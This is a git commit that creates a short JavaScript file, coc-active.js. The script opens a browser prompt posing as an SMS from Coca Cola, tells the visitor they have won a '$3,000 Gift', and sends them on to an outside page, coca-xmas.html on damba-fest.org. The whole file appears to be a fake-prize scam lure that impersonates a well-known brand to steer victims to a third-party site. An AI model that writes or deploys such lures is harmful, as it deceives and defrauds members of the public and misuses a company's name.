3abfabe5c3a8ed7a35e9fa073590c8ec33bcb14a
boss-bloq <nsisboy01@gmail.com>
2024-12-09 14:23:50 -0800

    Create coc-active.js

---
+++ coc-active.js
@@ -0,0 +1,6 @@
+
+var password = 'SPIN TO WIN $3,000'
+password=prompt('SMS: Congratulations You are qualify to spin and win $3,000 Gift from Coca Cola, Kindly Press OK to Claim $3,000 Gift   ','SPIN TO WIN $3,000');
+if (password != 'SPIN TO WIN $3,000') {
+location.href='https://damba-fest.org/coca-xmas.html';
+}
